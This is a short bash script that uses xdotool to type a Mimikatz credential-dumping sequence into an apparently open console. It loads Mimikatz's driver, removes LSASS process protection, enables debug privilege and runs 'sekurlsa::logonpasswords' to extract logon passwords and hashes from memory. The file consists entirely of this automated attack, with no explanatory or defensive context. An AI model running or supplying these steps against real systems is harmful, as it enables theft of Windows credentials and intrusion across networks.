#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "!+"
xdotool key Return
xdotool key Return

paste_command "!processprotect /process:lsass.exe /remove"
xdotool key Return

paste_command "privilege::debug"
xdotool key Return

paste_command "sekurlsa::logonpasswords"
xdotool key Return

